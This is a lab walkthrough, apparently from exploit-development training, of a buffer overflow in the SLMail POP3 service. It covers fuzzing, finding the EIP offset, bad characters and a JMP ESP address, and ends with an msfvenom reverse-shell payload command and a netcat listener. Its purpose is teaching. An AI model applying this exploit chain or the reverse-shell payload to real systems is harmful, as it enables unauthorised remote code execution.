# SLmail Example Overflow

## Getting started
1. On the windows box install SLMail with all the default settings

2. Start your ssh server on your kali machine using `service ssh start` (so we can putty from the windows box to save us flipping backwards and forwards)

3. Connect to the windows box in full screen using the `-f` flag, if you need to minimize use `ctrl + alt + enter`

4. Using putty connect back to your kali box

5. Start the SLMail programme with administrator privs

6. Start Immunity Debugger and attach the SLMail process to it `File > Attach > Select from the list`

7. The debugger starts paused, so click the `play` icon in the top left

## Fuzzing a particular input

1. We can now run a fuzzer which just throws increasing amounts of capital `A` characters at an particular input, see `pop3-sl-fuzzing.py`

2. When running we can see the fuzzing script throwing increasing amounts of bytes at the programme and immunity will eventual inform us that SLmail has errored (in the bottom left)

   ```
   root@kali:~/Desktop/lessons/slmail# ./pop3-sl-fuzzing.py
   Fuzzing PASS with 1 bytes
   Fuzzing PASS with 100 bytes
   Fuzzing PASS with 300 bytesFuzzing PASS with 500 bytes
   Fuzzing PASS with 700 bytes
   Fuzzing PASS with 900 bytes
   Fuzzing PASS with 1100 bytes
   Fuzzing PASS with 1300 bytes
   Fuzzing PASS with 1500 bytes
   Fuzzing PASS with 1700 bytes
   Fuzzing PASS with 1900 bytes
   Fuzzing PASS with 2100 bytes
   Fuzzing PASS with 2300 bytes
   Fuzzing PASS with 2500 bytes
   Fuzzing PASS with 2700 bytes
   Fuzzing PASS with 2900 bytes
   ```

3. When looking at ImmunityDB we can see that our registers `EBP` and `EIP` have also been filled with `A` characters (represented by  `41`), we can right click on these registers. You can also right click on the register and choose `Follow Dump`

4. It's important to note that the `EIP` register controls the execution of the code, so manipulating this may allow us to hijack the programme

5. Restart SLmail and the debugger as normal, remember to click the `play` icon to kick off the programme once it's attached

## Replicating
1. Now we need to create a script that will replicate the crash without having to fuzz each time, this is done using a script that replicates the number of bytes we know to cause the crash (see `pop3-slmail-replication.py`)

2. After using the script we can see that again we have managed to crash the programme and overwrite the EIP register

3. Restart SLmail and the debugger as normal, remember to click the `play` icon to kick off the programme once it's attached

## Controlling EIP
1. Controlling EIP is important because it allows us to hijack the programme, so we need to find out which bytes are effecting EIP

2. We do this using a ruby script called `pattern_create.rb`, to find this use `updatedb; locate pattern_create`

3. We can then run this programme to generate a unique set of 2700 bytes `/usr/share/metasploit-framework/tools/pattern_create.rb 2700`

4. Take the buffer generated and plug it into our exploit (see `pop3-slmail-pattern.py`)

5. Run the exploit and our programme once again crashes but this time with a different value in the `EIP` register

6. We can then use the `pattern_offset.rb` script to find out which bytes are in the `EIP` register  (it's in the same directory as pattern_create)

7. Running `/usr/share/metasploit-framework/tools/pattern_offset.rb 39694438` where `39694438` was the contents of our EIP register gives us the offset location `2606`

8. Lets restart as usual and then we will modify the exploit to confirm this

9. We modified the exploit to now print "A" characters until offset 2606, "B" characters for 4 characters, and then "C" characters for the rest. You can see this exploit in `pop3-sl-pconfirmation.py`

10. Now when we run our exploit EIP should be filled with "B" characters (`42`), confirming that the 4 bytes inhabited by "B" are indeed controlling the EIP register

## Finding a location for shellcode
1. If we examine the `ESP` register by right clicking and then going to `Follow Dump`, we can see that it points to the start of our C location

2. Unfortunately the typical shellcode is between 350/400 bytes and we can only see we control ~84 bytes

3. Lets restart and then try sending a large enough "C" payload to see if we can extend our overflow

4. We modify our exploit to be at least 3500 bytes long, you can see this in `pop3-sl-shellcheck.py`

5. Once we run that and follow `ESP` again we can see that we have many more "C" values more than enough for our shellcode

6. Restart and get ready for the next section 

## Check for Bad Characters
1. We need to check for bad characters that might have adverse effects on our programme, we do this by effectively sending all characters from `00` to `FF`

2. I've modified the explit to send all the bad characters, this can be found at `pop3-sl-badcharacters.py`

3. Then we run the script and once it causes the crash we will check for truncation and mangeled/missing characters by checking the ESP register again

4. For example if we look at the list of hex we can see that `0A` is missing and seems to have truncated further data, we will remove this then restart/rerun our script

5. Repeat step 4 until you have removed and noted all bad characters, a completed script can be found at `pop3-sl-badcharacterscomplete.py` and we found the bad characters `\x00 \x0a \x0d`

## Finding a redirection execution
1. As our buffer is stored in different address each time, we need to find a way to consistantly redirect code to the `ESP` register which will be pointing to our shell code

2. So we need to find the instruction `JMP ESP` which does not change on restart

3. We use `mona` for this, by typing `!mona modules`, which lists out all the modules the programme uses

4. We then need to find a module with no protections (such as `ASLR`) and no bad characters in it's address such as `00`

5. The only one we find is `SLMFC.dll`, now we look for the `JMP ESP` command

6. Click the dll and then click on the `e` in the top bar, then double click on our `SLMFC.dll`

7. Right click on the machine code, go to `search for` and then `command` and type `jmp esp`, which unfortunately none will be found

8. So lets try searching for a sequence using `search for` and then `command sequence`, typing `push esp` and then `rtn` on a new line

9. However all is not lost, this only searches the code marked as executable but as the module is not protected by ASLR/DEP we can use any code from the module (use `m` from the top bar to see what is executable)

10. Now lets search for the opcode of `jmp esp`, which can be found using `nasm_shell.rb`

11. By executing nasm_shell we find the opcode is `FFE4`

    ```
    /usr/share/metasploit-framework/tools/nasm_shell.rb
    nasm > jmp esp
    00000000  FFE4              jmp esp
    ```

12. We then use mona to search for this within the dll, using `!mona find -s "\xff\xe4" -m slmfc.dll` 

13. Look for one with an address that doesn't contain any bad characters such as `0x5f4a358f`

14. To verify this go to that specific address using the blue icon next to the `l`, which will take you to any address entered

15. Restart SLM and the debugger

16. Now lets replace our EIP with the address we found, remember it's little endian so reverse it. You can see this in `pop3-sl-jumpconfimation.py`.

17. Place a breakpoint on our `jmp esp` so we can confirm that it gets executed, this is done by going to the address and pressing `F2`

18. Run our confirmation script and we should hit our breakpoint pausing execution

19. Press `F8` and it will execute `jmp esp` and move programme execution to our `C`s

## SHELLCODE!
1. Restart SLM and the debugger

2. We will generate our shell code with `msfvenom`, using `msfvenom -p windows/shell_reverse_tcp LHOST=YO.UR.IP.AD LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`

3. This generates our shell payload and tells us how many bytes it is

4. Enter this into our exploit, along with some buffer NOPS (16 `\x90`) to give our code some room to decode, you can see this exploit at `pop3-sl-fullexploit.py`

5. Enter a breakpoint on our `jmp esp` so we can watch the shellcode execute and setup a listener using netcat `nc -lvp 443`

6. Run the exploit, once the breakpoint is hit you can press `F8` to watch you exploit decode and execute. Click the play icon to run code

7. You will eventually get a windows shell on your listener and you can confirm this by using `whoami`
